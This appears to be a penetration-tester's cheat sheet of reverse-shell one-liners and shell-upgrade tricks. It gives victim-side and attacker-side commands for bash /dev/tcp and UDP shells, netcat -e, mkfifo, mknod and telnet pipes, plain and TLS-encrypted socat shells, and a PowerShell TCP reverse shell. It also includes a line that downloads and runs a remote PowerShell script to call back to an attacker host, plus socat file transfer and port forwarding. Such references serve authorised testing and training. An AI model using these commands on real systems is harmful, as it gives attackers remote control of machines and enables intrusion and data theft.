# Linux fully interactive tty

```bash
python -c 'import pty; pty.spawn("/bin/bash")' || python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL + Z
stty raw -echo
fg
reset
export SHELL=/bin/bash && export TERM=xterm-256color
# open up a new terminal and run the below to get the stty size command to paste
size=$(stty size); rows=$(echo $size | cut -d' ' -f1); cols=$(echo $size | cut -d' ' -f2); echo "stty rows $rows columns $cols"
```

# Windows better tty using `rlwrap`
1. install rlwrap using `apt install rlwrap`
2. using rlwrap before your standard listener `rlwrap nc -lvnp <LPORT>`

# Windows fully interactive (Windows 10 / Windows Server 2019 version 1809)
## on attacker machine:
`stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>`
## on victim machine:
`IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>`

# Bash
## normal
```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```
## make it non-blocking
```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &
```
## using `exec` 
```bash
exec 5<>/dev/tcp/<LHOST>/<LPORT>; cat <&5 | while read line; do $line 2>&5 >&5; done
```
## Bash/Netcat:
```bash
nc -nv <LHOST> <LPORT> -e /bin/bash
```
## mkfifo:
```bash
rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh -i < /tmp/pipe 2>&1 | nc <LHOST> <LPORT> > /tmp/pipe; rm /tmp/pipe
```
## mknod:
```bash
rm /tmp/pipe; mknod /tmp/pipe p 2>/dev/null && nc <LHOST> <LPORT> 0</tmp/pipe | /bin/bash 1>/tmp/pipe; rm /tmp/pipe
```
## Bash UDP
### victim:
```bash
sh -i >& /dev/udp/<LHOST>/<LPORT> 0>&1
```
### attacker: 
```bash
nc -u -lvp <LPORT>
```
## Telnet
```bash
rm /tmp/pipe; mknod /tmp/pipe p && telnet <LHOST> <LPORT> 0</tmp/pipe | /bin/bash 1>/tmp/pipe; rm /tmp/pipe
```
---
## socat: reverse shell (with forking and address reuse)
### on attacker
```bash
socat -d -d TCP4-LISTEN:443,reuseaddr,fork STDOUT
```
### on victim (NOTE: you can use `netcat` to connect back to socat listener without problems)
```bash
socat TCP4:127.0.0.1:443 EXEC:/bin/bash
```
**OR**
```bash
nc -nv 127.0.0.1 443 -e /bin/bash
```
## socat: encrypted reverse shell (with forking and address reuse)
### step #1: on attacker machine, generate a create a key and a certificate associated with it.
```bash
openssl req -newkey rsa:2048 -nodes -keyout socat.key -x509 -days 1000 -out socat.crt
```
### step #2: on attacker machine,create a pem file from the key and crt files
```bash
cat socat.key socat.crt > socat.pem
```
### step #3: on attacker machine, listen on a port of your choice
```bash
socat -d -d OPENSSL-LISTEN:443,cert=socat.pem,verify=0,reuseaddr,fork STDOUT
```
### step #4: on the victim, send back a bash shell
```bash
socat OPENSSL:127.0.0.1:443,verify=0, EXEC:/bin/bash
```
## socat: encrypted file transfer
### on machine hosting the file:
```bash
socat -d -d OPENSSL-LISTEN:443,cert=socat.pem,verify=0,reuseaddr,fork file:file.txt
```
### on machine receiving the file:
```bash
socat OPENSSL:127.0.0.1:443,verify=0 file:file.txt,create
```
## socat: port forwarding
### scenario: if web port port 8000 is only listening locally on a machine that has socat. we can bind it to the outside on port 1234 and expose it to the outside:
```bash
socat TCP-LISTEN:1234,fork,reuseaddr, tcp:127.0.0.1:8000 &
```
### if we curl the address on port 1234
```bash
curl http://192.168.145.131:1234/index.html
```
### we get a response
```
<h1>hosted only internally</h1>
```
---

## Powershell reverse shell
```powershell
$lhost = '<LHOST_IP>'
$lport = <LPORT>
$client = New-Object System.Net.Sockets.TCPClient($lhost,$lport);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}
$client.Close();
```

---